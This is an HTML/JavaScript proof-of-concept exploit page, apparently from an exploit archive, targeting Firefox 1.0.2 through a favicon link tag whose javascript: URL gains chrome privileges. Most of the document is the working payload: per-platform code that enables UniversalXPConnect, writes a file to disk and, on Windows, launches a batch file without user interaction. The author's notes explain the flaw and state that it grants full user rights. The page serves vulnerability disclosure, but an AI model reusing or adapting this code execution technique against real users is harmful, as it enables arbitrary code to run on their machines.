Mozilla Browsers x (Link) Code Execution Exploit
================================================

<!--
Comment placed below to keep the author info together:
/str0ke 

__Contact Informations

Michael Krax <mikx@mikx.de>
http://www.mikx.de/?p=15

mikx
-->

<html>
<head>
	<title>Firelinking - Proof-of-Concept</title>
    <link rel="SHORTCUT ICON" href="favicon.ico">    
    <script language="JavaScript" type="text/javascript">
    var pf = navigator.platform.toLowerCase();
    if (pf.indexOf("win") != -1) {
        var os = "win";
    } else if (pf.indexOf("mac") != -1) {
        var os = "mac";
    } else {
        var os = "linux"
    }
    function runDemo() {
        // this is an ugly caching workaround
        document.getElementById(&#039;outhtml&#039;).innerHTML = "";
        document.getElementById(&#039;outhtml&#039;).innerHTML += document.getElementById(&#039;clearhtml&#039;).value
        document.getElementById(&#039;outhtml&#039;).innerHTML += document.getElementById(&#039;clearhtml&#039;).value
        document.getElementById(&#039;outhtml&#039;).innerHTML += document.getElementById(&#039;clearhtml&#039;).value
        window.setTimeout("document.getElementById(&#039;outhtml&#039;).innerHTML += document.getElementById(&#039;linkhtml_"+os+"&#039;).value",300);
    } 
    </script>
</head>
<body>
<div style="font-family:Verdana;font-size:11px;">

<div style="font-family:Verdana;font-size:15px;font-weight:bold;">Firelinking - Proof-of-Concept</div>

Designed for Firefox 1.0.2 | bugzilla <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=290036" target="_blank">#290036</a>
<br><br>
<div style="width:600px">

<div id="outhtml" style="display:none"></div>

<textarea id="clearhtml" style="display:none">
<link rel="SHORTCUT ICON" href="favicon.ico">
</textarea>

<textarea id="linkhtml_win" style="display:none">
<link rel="SHORTCUT ICON" href="javascript:delayedOpenWindow(&#039;javascript:netscape.security.PrivilegeManager.enablePrivilege(\&#039;UniversalXPConnect\&#039;);file=Components.classes[\&#039;@mozilla.org/file/local;1\&#039;].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\&#039;c:\\\\booom.bat\&#039;);file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\&#039;@mozilla.org/network/file-output-stream;1\&#039;].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init(file,0x04|0x08|0x20,420,0);output=\&#039;@ECHO OFF\\n:BEGIN\\nCLS\\nDIR\\nPAUSE\\n:END\&#039;;outputStream.write(output,output.length);outputStream.close();file.launch();&#039;,&#039;&#039;,&#039;&#039;)">
</textarea>

<textarea id="linkhtml_mac" style="display:none">

<link rel="SHORTCUT ICON" href="javascript:delayedOpenWindow(&#039;javascript:netscape.security.PrivilegeManager.enablePrivilege(\&#039;UniversalXPConnect\&#039;);file=Components.classes[\&#039;@mozilla.org/file/local;1\&#039;].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\&#039;/booom.txt\&#039;);file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\&#039;@mozilla.org/network/file-output-stream;1\&#039;].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init(file,0x04|0x08|0x20,420,0);output=\&#039;booom!\&#039;;outputStream.write(output,output.length);outputStream.close();&#039;,&#039;&#039;,&#039;&#039;)">
</textarea>

<textarea id="linkhtml_linux" style="display:none">
<link rel="SHORTCUT ICON" href="javascript:delayedOpenWindow(&#039;javascript:netscape.security.PrivilegeManager.enablePrivilege(\&#039;UniversalXPConnect\&#039;);file=Components.classes[\&#039;@mozilla.org/file/local;1\&#039;].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\&#039;~/booom.txt\&#039;);file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE,420);outputStream=Components.classes[\&#039;@mozilla.org/network/file-output-stream;1\&#039;].createInstance(Components.interfaces.nsIFileOutputStream);outputStream.init(file,0x04|0x08|0x20,420,0);output=\&#039;booom!\&#039;;outputStream.write(output,output.length);outputStream.close();&#039;,&#039;&#039;,&#039;&#039;)">
</textarea>


<strong><u>NOTICE:</u></strong> I really wonder why the Mozilla Foundation decided to release a serious security update on a friday night and to disclose the link to my proof-of-concept code so quickly. It wasn&#039;t intendet from my side to release this as a 0day exploit. Please complain to <a href="mailto:security@mozilla.org">security@mozilla.org</a> if you disagree with their release policy. Sorry, no CVE candidate number yet for that reason.
<br><br><br>
The link tag allows to load a custom image as the icon for a website, displayed in the location bar and in the tab title. 
<br><br>

By setting the href attribute of this tag to a javascript url, it is possible to call chrome functions and run arbitrary code without user interaction. 
<br><br>
The example is cross platform: On Windows this example creates the file c:\booom.bat and launches it (opens a dos box with a dir command). On Linux (tested Fedora Core) and MacOSX the example creates the file ~/booom.txt or /booom.txt. 
<br><br>
The non-windows examples are only roughly tested. Please don&#039;t complain if not working. I doubt every Mac user can write to root by default. You get full user rights with UniversalXPConnect, so everything else is just a matter of implementation time.
<br><br>
<a href="#" onclick="runDemo();runDemo();">Run example</a> (cross platform)
<br><br><br>

</div>
</body>
</html>


